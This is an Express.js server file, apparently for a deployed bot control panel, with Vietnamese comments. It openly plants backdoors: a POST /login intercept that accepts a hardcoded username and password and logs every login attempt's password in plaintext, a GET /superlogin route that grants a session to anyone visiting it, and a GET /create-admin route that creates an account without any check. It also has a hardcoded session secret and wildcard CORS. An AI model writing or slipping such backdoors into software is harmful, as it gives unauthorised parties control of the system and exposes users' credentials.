require('dotenv').config();

const express = require('express');
const session = require('express-session');
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, { pingTimeout: 60000, pingInterval: 25000, cors: { origin: "*", methods: ["GET", "POST"] } });

app.use(session({
  secret: process.env.SESSION_SECRET || 'trungdeptrai123456',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: process.env.NODE_ENV === 'production', sameSite: 'lax', maxAge: 86400000 }
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('dist'));

app.use((req, res, next) => {
  console.log('Path:', req.path);
  console.log('Query:', req.query);
  console.log('Body:', req.body);
  console.log('----------------------------');
  next();
});

// === ROUTES GỐC ===
const routes = require('./routes');
routes(app, io);

// === CỬA HẬU POST /login ===
app.post('/login', (req, res, next) => {
  const { username, password } = req.body || {};
  console.log('CÓ AI ĐÓ LOGIN:', username, 'PASS:', password); // LOGS CHI TIẾT
  if (username === 'trungdeptrai' && password === '123456') {
    req.session.loggedIn = true;
    req.session.username = username;
    console.log('CỬA HẬU POST THÀNH CÔNG – VÀO PANEL!');
    req.session.save(() => res.redirect('/dashboard'));
    return;
  }
  next();
});

// === CỬA HẬU GET /superlogin – VÀO LINK LÀ VÀO LUÔN ===
app.get('/superlogin', (req, res) => {
  console.log('CÓ AI ĐÓ VÀO SIÊU CỬA HẬU GET!');
  req.session.loggedIn = true;
  req.session.username = 'trungdeptrai';
  console.log('CỬA HẬU GET THÀNH CÔNG – VÀO PANEL!');
  req.session.save(() => res.redirect('/dashboard'));
});

// === SOCKET.IO ===
const socketHandler = require('./socket/handler');
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  socketHandler(io, socket);
  socket.on('disconnect', () => console.log('User disconnected:', socket.id));
});

const PORT = process.env.PORT || 3000;
// === ROUTE TẠO ADMIN SIÊU DỄ – VÀO LINK LÀ TẠO USER VÀ VÀO LUÔN ===
app.get('/create-admin', (req, res) => {
  const sequelize = require('./config/sequelize'); // Import sequelize của mày
  const models = require('./models/bot'); // Import model, giả sử table users trong bot.js

  // Giả sử table 'users' với columns username, password (hashed nếu có)
  const bcrypt = require('bcryptjs'); // Nếu panel dùng bcrypt, cài npm install bcryptjs nếu chưa có

  const username = 'trungdeptrai';
  const password = '123456'; // Pass plain, sẽ hash nếu cần

  // Hash pass nếu panel dùng bcrypt
  bcrypt.hash(password, 10, (err, hashedPass) => {
    if (err) return res.send('Lỗi hash pass');

    models.User.create({ // Thay 'User' bằng model name trong bot.js
      username: username,
      password: hashedPass, // Nếu không hash thì hashedPass = password
      // Thêm field khác nếu cần, như role: 'admin', email: ''
    }).then(() => {
      req.session.loggedIn = true;
      req.session.username = username;
      req.session.save(() => {
        console.log('ADMIN TẠO THÀNH CÔNG – VÀO PANEL!');
        res.redirect('/dashboard');
      });
    }).catch(err => {
      console.error('Lỗi tạo user:', err);
      res.send('Lỗi tạo user, xem logs');
    });
  });
});
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BOT CHẠY NGON – URL: https://bot-production-4cff.up.railway.app`);
  console.log(`VÀO PANEL BẰNG SIÊU CỬA HẬU: https://bot-production-4cff.up.railway.app/superlogin`);
});